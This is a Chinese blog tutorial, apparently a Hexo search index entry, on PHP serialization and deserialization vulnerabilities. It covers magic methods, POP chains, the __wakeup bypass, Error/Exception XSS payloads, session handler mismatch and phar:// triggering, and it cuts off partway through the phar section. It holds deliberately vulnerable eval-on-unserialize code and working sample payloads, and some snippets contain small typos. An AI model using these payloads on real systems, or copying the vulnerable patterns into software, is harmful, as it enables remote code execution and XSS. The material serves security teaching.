<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2021/05/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
    <content><![CDATA[<h1 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h1><h2 id="PHP类与对象"><a href="#PHP类与对象" class="headerlink" title="PHP类与对象"></a>PHP类与对象</h2><ul>
<li>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。</li>
<li>反序列化则相反将字符串重新恢复成对象</li>
<li>对象的序列化利于对象的 <strong>保存和传输</strong> ，也可以让<strong>多个文件共享对象</strong>。</li>
</ul>
<h2 id="PHP-Magic-方法"><a href="#PHP-Magic-方法" class="headerlink" title="PHP Magic 方法"></a>PHP Magic 方法</h2><p>PHP类中一般会包含一些特殊的函数叫做magic函数，这些函数以双斜划线开始，他们的主要作用是在某些情况下，自动调用，以保证程序的健壮性，但也是由于这些方法的自动调用，使得程序在一些情况下存在漏洞。</p>
<h4 id="PHP常见的magic方法"><a href="#PHP常见的magic方法" class="headerlink" title="PHP常见的magic方法"></a>PHP常见的magic方法</h4><ol>
<li><p>__construct</p>
<p>在创建对象时候初始化对象，一般用于对变量赋初值</p>
</li>
<li><p>__destruct</p>
<p>和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</p>
</li>
<li><p>__toString</p>
<p>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发,返回值需要为字符串</p>
</li>
<li><p>__wakeup()</p>
<p>使用unserialize时触发，反序列化恢复对象之前调用该方法</p>
</li>
<li><p>__sleep()</p>
<p>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该                   数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</p>
</li>
<li><p>__destruct()</p>
<p>对象被销毁时触发</p>
</li>
<li><p>__call()</p>
<p>在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</p>
</li>
<li><p>__callStatic()</p>
<p>在静态上下文中调用不可访问的方法时触发</p>
</li>
<li><p>__get()</p>
<p>用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行</p>
</li>
<li><p>__set()</p>
<p>用于将数据写入不可访问的属性</p>
</li>
<li><p>__isset()</p>
<p>在不可访问的属性上调用isset()或empty()触发</p>
</li>
<li><p>__unset()</p>
<p>在不可访问的属性上使用unset()时触发</p>
</li>
<li><p>__invoke()</p>
<p>当脚本尝试将对象调用为函数时触发</p>
</li>
</ol>
<h2 id="PHP对象序列化"><a href="#PHP对象序列化" class="headerlink" title="PHP对象序列化"></a>PHP对象序列化</h2><ul>
<li><p>在PHP网站中的定义：</p>
<ul>
<li><p>所有PHP里面的值都是可以使用函数serialize（）来返回一个包含字节流的字符串表示。 unserialize()函数能够重新把字符串</p>
</li>
<li><p>变回PHP原来的值。序列化一个对象将会保存对象的所有变量，但不会保存对象的方法，只会保存类的名字。</p>
</li>
</ul>
</li>
<li><p>简单的理解：</p>
<ul>
<li><p>序列化：就是把一个类的实例变成一个字符串；</p>
</li>
<li><p>反序列化：就是把一个特殊的字符串转换成一个实例。</p>
</li>
</ul>
</li>
<li><p>那么为什么要有序列化这种机制存在呢？或者说序列化有什么作用呢？</p>
<ul>
<li>因为在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。试想,如果一个脚本想要调用之前一个脚本的变量，但是前一个脚本已经执行完毕，所有的变量和内容都已经释放掉了，我们要如何操作，才能引用前一个脚本的变量呢？难道要前一个脚本不断的循环等待后面脚本的调用，显然这是不现实的。serialize和unserialize（即序列化和反序列化)就是用来解决这一问题的。serialize可以将变量转换为字符串并且在变换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串转换为变量。</li>
</ul>
</li>
<li><p>序列化后的字符串格式如下：</p>
<ul>
<li><p>O:6:”animal”:1:{s:4:”name”;s:7:”dahuang”;}</p>
</li>
<li><p>对象类型:长度:”名字”:类中变量的个数:{类型:长度:”名字”;类型:长度:”值”;……}</p>
</li>
<li><p>例子：</p>
<ul>
<li>```php<?php   
 class Ctf{        
    public $flag='flag{****}';       
    public $name='cxk';        
    public $age='10';   
 }    
 $ctfer=new Ctf();     //实例化一个对象    
 $ctfer->flag='flag{adedyui}';    
 $ctfer->name='Sch0lar';    
 $ctfer->age='18'    
 echo serialize($ctfer); ?>
?&gt;/*输出结果<br>O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;}   O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示<br>   3代表类的名字长三个字符<br>   Ctf 是类名<br>   3代表这个类里有三个属性(三个变量)<br>   s代表字符串<br>   4代表属性名的长度<br>   flag是属性名<br>   s:13:”flag{adedyui}” 字符串，属性长度，属性值<br>*/<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  ###  序列化中参数：</span><br><span class="line"></span><br><span class="line">  - a - array                                b - boolean </span><br><span class="line"></span><br><span class="line">  - d - double                            i - integer</span><br><span class="line"></span><br><span class="line">  - o - common object          r - reference</span><br><span class="line"></span><br><span class="line">  - s - string                               C - custom object</span><br><span class="line"></span><br><span class="line">  - O - class                                N - null</span><br><span class="line"></span><br><span class="line">  - R - pointer reference      U - unicode string</span><br><span class="line"></span><br><span class="line">  - d - double                            i - integer</span><br><span class="line"></span><br><span class="line">  - o - common object          r - reference</span><br><span class="line"></span><br><span class="line">  - s - string                               C - custom object</span><br><span class="line"></span><br><span class="line">  - O - class                                N - null</span><br><span class="line"></span><br><span class="line">  - R - pointer reference      U - unicode string</span><br><span class="line"></span><br><span class="line">#### _sleep()函数</span><br><span class="line"></span><br><span class="line">  - serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。可以在__sleep()方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</span><br><span class="line"></span><br><span class="line">  - 例子：</span><br><span class="line"></span><br><span class="line">    - ```php</span><br><span class="line">      &lt;?php    </span><br><span class="line">          class Ctf&#123;        </span><br><span class="line">          public $flag=&#x27;flag&#123;****&#125;&#x27;;        </span><br><span class="line">          public $name=&#x27;cxk&#x27;;        </span><br><span class="line">          public $age=&#x27;10&#x27;;        </span><br><span class="line">          public function __sleep()&#123;           </span><br><span class="line">              return array(&#x27;flag&#x27;,&#x27;age&#x27;);      </span><br><span class="line">              &#125; </span><br><span class="line">          &#125;    </span><br><span class="line">          $ctfer=new Ctf();  </span><br><span class="line">          $ctfer-&gt;flag=&#x27;flag&#123;abedyui&#125;&#x27;;    </span><br><span class="line">          $ctfer-&gt;name=&#x27;Sch0lar&#x27;;  </span><br><span class="line">          $ctfer-&gt;age=&#x27;18&#x27;   </span><br><span class="line">          echo serialize($ctfer);</span><br><span class="line">      ?&gt; </span><br><span class="line">      - // 输出结果 O:3:&quot;Ctf&quot;:2:</span><br><span class="line">      - //&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125; 即__sleep()方法使 flag age 属性序列化，而name并没有被序列化。所以可以在__sleep()方法里决定哪些属性被序列化。</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h4><ul>
<li><p>根据<strong>访问控制修饰符</strong>的不同 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同</p>
</li>
<li><p>public(公有)  </p>
</li>
<li><p>protected(受保护)                              // %00*%00属性名                  </p>
</li>
<li><p>private(私有的)                                   // %00类名%00属性名</p>
</li>
<li><p>protected属性被序列化的时候属性值会变成 %00*%00属性名</p>
</li>
<li><p>private属性被序列化的时候属性值会变成 %00类名%00属性名</p>
</li>
<li><p>（%00为空白符，空字符也有长度，一个空字符长度为 1）</p>
</li>
<li><p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;        </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;Sch0lar&#x27;</span>;       </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="string">&#x27;19&#x27;</span>;       </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&#x27;get flag&#x27;</span>;   </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="variable">$ctfer</span>=<span class="keyword">new</span> Ctf();     <span class="comment">//实例化一个对象   </span></span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$ctfer</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 输出结果</span></span><br><span class="line"><span class="comment"> O:3:&quot;Ctf&quot;:3:</span></span><br><span class="line"><span class="comment"> &#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;</span></span><br><span class="line"><span class="comment">可以观察到：</span></span><br><span class="line"><span class="comment">- s:6:&quot;*age&quot;   前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6</span></span><br><span class="line"><span class="comment">- s:9:&quot;Ctfflag&quot;   类名Ctf前后出现两个%00空白符，所以长度为9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="php的反序列化"><a href="#php的反序列化" class="headerlink" title="php的反序列化"></a>php的反序列化</h2><ul>
<li><p>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去</p>
</li>
<li><p>例子：</p>
</li>
<li><p>```php</p>
<?php    
    class Ctf{        
    public $flag='flag{****}';        
    public $name='cxk';     
    public $age='10';    }   
    $ctfer=new Ctf();     //实例化一个对象    
    $ctfer->flag='flag{adedyui}';    
    $ctfer->name='Sch0lar';    
    $ctfer->age='18'    
    $str=serialize($ctfer);    
    echo '<pre>';    
    var_dump(unserialize($str))  
?><p>/*输出结果 </p>
<pre><code>object(Ctf)#2 (3) &#123; 
[&quot;flag&quot;]=&gt;   
string(13) &quot;flag&#123;abedyui&#125;&quot;    
[&quot;name&quot;]=&gt;   
string(7) &quot;Sch0lar&quot;   
[&quot;age&quot;]=&gt;   
string(2) &quot;18&quot; 
&#125;
</code></pre>
<p>*/</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 与序列化函数类似，unserialize()会检查类中是否存在一个__wakeup魔术方法如果存在则会先调用__wakeup()方法，再进行序列化可以在__wakeup()方法中对属性进行初始化、赋值或者改变。 </span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php    </span><br><span class="line">    class Ctf&#123;       </span><br><span class="line">    public $flag=&#x27;flag&#123;****&#125;&#x27;;        </span><br><span class="line">    public $name=&#x27;cxk&#x27;;       </span><br><span class="line">    public $age=&#x27;10&#x27;;       </span><br><span class="line">    public function __wakeup()&#123;            </span><br><span class="line">        $this-&gt;flag=&#x27;no flag&#x27;; //在反序列化时，flag属性将被改变为“no flag&quot;       </span><br><span class="line">            &#125;   </span><br><span class="line">     &#125;    </span><br><span class="line">     ctfer=new Ctf();     //实例化一个对象    </span><br><span class="line">     $ctfer-&gt;flag=&#x27;flag&#123;adedyui&#125;&#x27;;   </span><br><span class="line">     $ctfer-&gt;name=&#x27;Sch0lar&#x27;;   </span><br><span class="line">     $ctfer-&gt;age=&#x27;18&#x27;   </span><br><span class="line">     $str=serialize($ctfer);   </span><br><span class="line">     echo &#x27;&lt;pre&gt;&#x27;;   </span><br><span class="line">     var_dump(unserialize($str)); </span><br><span class="line">?&gt; </span><br><span class="line">/*</span><br><span class="line">    反序列化之前重新给flag属性赋值</span><br><span class="line"></span><br><span class="line">输出结果 </span><br><span class="line">    object(Ctf)#2 (3) &#123;</span><br><span class="line">    [&quot;flag&quot;]=&gt;    </span><br><span class="line">    string(13) &quot;no flag&quot; </span><br><span class="line">    [&quot;name&quot;]=&gt;    </span><br><span class="line">    string(7) &quot;Sch0lar&quot;   </span><br><span class="line">    [&quot;age&quot;]=&gt;    </span><br><span class="line">    string(2) &quot;18&quot;</span><br><span class="line">    &#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="反序列化POP链"><a href="#反序列化POP链" class="headerlink" title="反序列化POP链"></a>反序列化POP链</h3><ul>
<li><p>unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</p>
</li>
<li><p>当反序列化参数可控时，可能会产生PHP反序列化漏洞。</p>
</li>
<li><p>在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化中有一种漏洞利用方法叫做 “面向属性编程”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”</p>
</li>
<li><p>在PHP中，“组件”就是那些魔术方法（如：wakeup()或destruct）</p>
</li>
</ul>
<h2 id="PHP反序列化漏洞（常规）"><a href="#PHP反序列化漏洞（常规）" class="headerlink" title="PHP反序列化漏洞（常规）"></a>PHP反序列化漏洞（常规）</h2><p>原理：</p>
<ul>
<li><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
</li>
<li><p>在反序列化的过程中自动触发了某些魔术方法。</p>
</li>
</ul>
<p>漏洞触发条件：</p>
<ul>
<li><p> unserialize函数的参数、变量可控</p>
</li>
<li><p> php文件中存在可利用的类，类中有魔术方法</p>
</li>
</ul>
<p>魔术方法：</p>
<ul>
<li><p>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。</p>
</li>
<li><p>__destruct() 当一个对象销毁（反序列化）时被调用</p>
</li>
<li><p>__toString() 当一个对象被当作一个字符串使用时被调用</p>
</li>
<li><p>__sleep() 在对象在被序列化之前立即运行</p>
</li>
<li><p>__wakeup() 将在序列化之后立即被调用</p>
</li>
<li><p>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
</li>
</ul>
<h4 id="绕过魔法方法的反序列化漏洞"><a href="#绕过魔法方法的反序列化漏洞" class="headerlink" title="绕过魔法方法的反序列化漏洞"></a>绕过魔法方法的反序列化漏洞</h4><ul>
<li>两个魔法函数wakeup() 和sleep()</li>
<li>unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
<li>sleep()则相反，是用在序列化一个对象时被调用</li>
</ul>
<h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h5><ul>
<li><p>将在序列化之后立即被调用</p>
</li>
<li><p>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。这个大家应该都知道很常见的姿势了。</p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/aebd9e90-c94e-4387-8398-6ed34c927ac3-12072792.jpg" alt="img"></p>
</li>
</ul>
<h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h5><ul>
<li><p>当一个对象被销毁时调用</p>
</li>
<li><p>例1:</p>
<ul>
<li><p>```php</p>
<?php class Example {    
    var $var = '';    
    function __destruct() {        
        eval($this->var);  
       } 
    } 
    unserialize($_GET['a']); 
?><p>　 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 要让eval($this-&gt;var);执行我们的恶意代码，我们就需要修改属性$var的值。接下来构造序列化数据： </span><br><span class="line"></span><br><span class="line">  - $obj = new Example(); </span><br><span class="line"></span><br><span class="line">  - $obj-&gt;var=&#x27;phpinfo()&#x27;; </span><br><span class="line"></span><br><span class="line">  - var_dump(serialize($obj)); </span><br><span class="line"></span><br><span class="line">  - 得 </span><br><span class="line"></span><br><span class="line">  - O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;phpinfo()&quot;;&#125; </span><br><span class="line"></span><br><span class="line">  - 反序列化后在脚本运行结束时就会调用__destruct函数，同时会覆盖$var变量输出执行eval(phpinfo())：</span><br><span class="line"></span><br><span class="line">- 例2：</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &lt;?php class A&#123;    </span><br><span class="line">      var $test = &quot;demo&quot;;   </span><br><span class="line">      function __destruct()&#123;     </span><br><span class="line">          @eval($this-&gt;test);   </span><br><span class="line">        &#125; </span><br><span class="line">     &#125; </span><br><span class="line">     $test = $_POST[&#x27;test&#x27;];</span><br><span class="line">     $len = strlen($test)+1;</span><br><span class="line">     $pp =&quot;O:1:\&quot;A\&quot;:1&#123;s:4:\&quot;test\&quot;;s:&quot;.$len.&quot;:\&quot;&quot;.$test.&quot;;\&quot;;&#125;&quot;; // 构造序列化对象，用我们POST传过去的命令代码字符串覆盖$test=&quot;demo&quot;，从而执行恶意命令。 </span><br><span class="line">     $test_unser = unserialize($pp); // 反序列化同时触发_destruct函数 </span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p><img src="https://api2.mubu.com/v3/document_image/44539d87-7d2d-4072-b45a-7ef88e37dd83-12072792.jpg" alt="img"></p>
</li>
<li><p><img src="https://api2.mubu.com/v3/document_image/b2ea8753-a172-400a-a7e8-571719fc22a2-12072792.jpg" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h5><ul>
<li><p>本节围绕着一个问题，如果在代码审计中有反序列化点，但是在原本的代码中找不到pop链该如何？ N1CTF有一个无pop链的反序列化的题目，其中就是找到php内置类来进行反序列化。</p>
</li>
<li><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串。</p>
</li>
<li><p>__toString当对象被当作一个字符串使用时候调用(不仅仅是echo的时候，比如file_exists()判断也会触发)</p>
</li>
</ul>
<h5 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h5><ul>
<li><p>适用于php7版本</p>
</li>
<li><p>Error类就是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。如果有个pop链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用echo 一个反序列化以后得到的类的写法，前文说了当对象被当作一个字符串使用时候调用(如echo的时候)会触发__toString方法，这是一种挖洞的新思路（对我而言）。</p>
</li>
<li><p>例1：（适用于php7）</p>
<ul>
<li><p>XSS 开启报错的情况下： </p>
</li>
<li><p>测试代码：</p>
</li>
<li><p>```php</p>
<?php 
    $a = unserialize($_GET['yds']); 
    echo $a;        // 这里echo了一个反序列化以后得到的类 
?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 仅看到是一个反序列化，但是不知道类啊，这就遇到了一个反序列化但没有pop链的情况，所以只能找到php内置类来进行反序列化 exp：</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &lt;?php </span><br><span class="line">      $a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);</span><br><span class="line">      $b = serialize($a); echo urlencode($b);  </span><br><span class="line">  ?&gt; </span><br><span class="line">  //得：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>例2：（适用于php5、7版本）</p>
</li>
<li><p>这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用。</p>
</li>
<li><p>XSS</p>
</li>
<li><p>开启报错的情况下:</p>
</li>
<li><p>测试代码：</p>
</li>
<li><p>```php</p>
<?php
$a = unserialize($_GET['yds']);
echo $a;       // 这里echo了一个反序列化以后得到的类
?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 仅看到是一个反序列化，但是不知道类啊，这就遇到了一个反序列化但没有pop链的情况，所以只能找到php内置类来进行反序列化          </span><br><span class="line"></span><br><span class="line">- exp：</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  &lt;?php</span><br><span class="line">     $a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;); </span><br><span class="line">     echo urlencode(serialize($a));</span><br><span class="line">  ?&gt;</span><br><span class="line">  </span><br><span class="line">  //得：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br><span class="line">  echo unserialize($c);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="PHP中Session反序列化（重点）"><a href="#PHP中Session反序列化（重点）" class="headerlink" title="PHP中Session反序列化（重点）"></a>PHP中Session反序列化（重点）</h2><ul>
<li><p>简介与基础知识</p>
<ul>
<li><p>在php.ini中存在三项配置项：</p>
<ul>
<li><p>session.save_path=”” –设置session的存储路径</p>
</li>
<li><p>session.save_handler=”” –设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</p>
</li>
<li><p>session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</p>
</li>
<li><p>session.serialize_handler string –定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</p>
</li>
<li><p>以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。</p>
</li>
</ul>
</li>
<li><p>在使用xampp组件安装中，上述的配置项的设置如下：</p>
<ul>
<li><p>session.save_path=”D:\xampp\tmp” 表明所有的session文件都是存储在xampp/tmp下</p>
</li>
<li><p>session.save_handler=files 表明session是以文件的方式来进行存储的</p>
</li>
<li><p>session.auto_start=0 表明默认不启动session</p>
</li>
<li><p>session.serialize_handler=php 表明session的默认序列化引擎使用的是php序列话引擎</p>
</li>
</ul>
</li>
<li><p>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
<ul>
<li><p>引擎</p>
<ul>
<li>session存储方式</li>
</ul>
</li>
<li><p>php(php&lt;5.5.4)</p>
<ul>
<li>键名+竖线|+经过serialize()函数序列处理的值（只序列化值）</li>
</ul>
</li>
<li><p>php_serialize(php&gt;5.5.4)</p>
<ul>
<li>经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</li>
</ul>
</li>
<li><p>php_binary</p>
<ul>
<li>键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
</ul>
</li>
</ul>
</li>
<li><p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎名’);进行设置。</p>
</li>
</ul>
</li>
</ul>
<h3 id="Session序列化漏洞利用"><a href="#Session序列化漏洞利用" class="headerlink" title="Session序列化漏洞利用"></a>Session序列化漏洞利用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">syclover</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span>=<span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;     <span class="comment">// __construct()在实例化是被调用 </span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="string">&quot;phpinfo()&quot;</span>; </span><br><span class="line">    &#125; <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125; </span><br><span class="line">  &#125; </span><br><span class="line">  unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问<a href="http://localhost/test.php?a=O:8:">localhost/test.php?a=O:8:</a>“syclover”:1:{s:4:”func”;s:14:”echo “spoock”;”;} 。 </p>
<p>那么反序列化得到的内容是：</p>
<p> object(syclover)[1] </p>
<p>public ‘func’ =&gt; string ‘echo “spoock”;’ (length=14) </p>
<p> <strong>最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。</strong>这就是一个简单的序列化的漏洞的演示</p>
<h3 id="PHP-Session中的序列化危害"><a href="#PHP-Session中的序列化危害" class="headerlink" title="PHP Session中的序列化危害"></a>PHP Session中的序列化危害</h3><ul>
<li><p>PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。</p>
<ul>
<li><p><strong>如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<ul>
<li><p>$_SESSION[‘spoock’] = ‘|O:11:”PeopleClass”:0:{}’;</p>
</li>
<li><p>上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是a:1:{s:6:”spoock”;s:24:”|O:11:”PeopleClass”:0:{}”;} 。</p>
</li>
<li><p>但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是：</p>
</li>
<li><p>array (size=1)</p>
</li>
<li><p>‘a:1:{s:6:”spoock”;s:24:”‘ =&gt; </p>
</li>
<li><p>object(__PHP_Incomplete_Class)[1]</p>
</li>
<li><p>public ‘__PHP_Incomplete_Class_Name’ =&gt; string ‘PeopleClass’ (length=11)</p>
</li>
<li><p>这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
</li>
<li><p>这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<ul>
<li><p>为防止转义，在引号前加上反斜杠\。最后就会将文件名写入到session中，具体的实现细节可以参考PHP手册。</p>
</li>
<li><p>注意与本地反序列化不一样的地方是要在最前方加上| ，因为这是php引擎的格式。</p>
</li>
</ul>
</li>
<li><p>参考：<a href="https://www.jb51.net/article/107101.htm">https://www.jb51.net/article/107101.htm</a></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h3><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如data://，zlib://或php://。这些操作通常用于远程文件，攻击者可以在其中控制文件包含完整的文件路径。</p>
<ul>
<li><p>例如常见的 include($_GET[‘file’]) include(‘php://filter/convert.base64-encode/resource=index.php’); include(‘data://text/plain;base64,cGhwaW5mbygpCg==’); </p>
</li>
<li><p>phar://也是流包装的一种</p>
<ul>
<li><p>phar://协议        可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
</li>
<li><p>phar文件 PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
</li>
<li><p>phar文件结构： </p>
</li>
<li><p>1.a stub</p>
<ul>
<li>识别phar拓展的标识，格式：xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub。前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 </li>
</ul>
</li>
<li><p>2.a manifest describing the contents</p>
<ul>
<li>被压缩文件的权限、属性等信息（是个php类）都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata——设置phar归档元数据。 </li>
</ul>
</li>
<li><p>3.the file contents</p>
<ul>
<li>被压缩文件的内容。 </li>
</ul>
</li>
<li><p>4.[optional] a signature for verifying Phar integrity (phar file format only)</p>
<ul>
<li>签名，放在文件末尾。对应函数Phar :: stopBuffering——停止缓冲对Phar存档的写入请求，并将更改保存到磁盘。 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h5><ul>
